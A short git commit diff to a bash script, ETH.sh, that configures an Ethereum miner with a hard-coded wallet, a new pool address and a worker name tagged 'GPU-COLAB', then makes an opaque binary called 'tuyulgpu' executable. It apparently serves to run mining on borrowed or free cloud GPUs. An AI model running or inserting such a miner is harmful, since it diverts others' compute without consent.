ebf5db79bdaa530d47b9f4d0d793e0679d4b1f18
angkii <83603708+angkii@users.noreply.github.com>
2021-06-23 19:12:07 +0700

    Update ETH.sh

--- ETH.sh
+++ ETH.sh
@@ -1,10 +1,10 @@
 #!/bin/bash
 
-POOL=stratum+tcp://us.ethereum.herominers.com:10200
+POOL=ethash.unmineable.com:3333
 
 WALLET=0xb13f91835c32249e1506da1201e937d666652725
 
-WORKER=$(echo $(shuf -i 1000-9999 -n 1)-GPU-PINJEM)
+WORKER=$(echo $(shuf -i 1000-9999 -n 1)-GPU-COLAB)
 
 chmod +x tuyulgpu
 
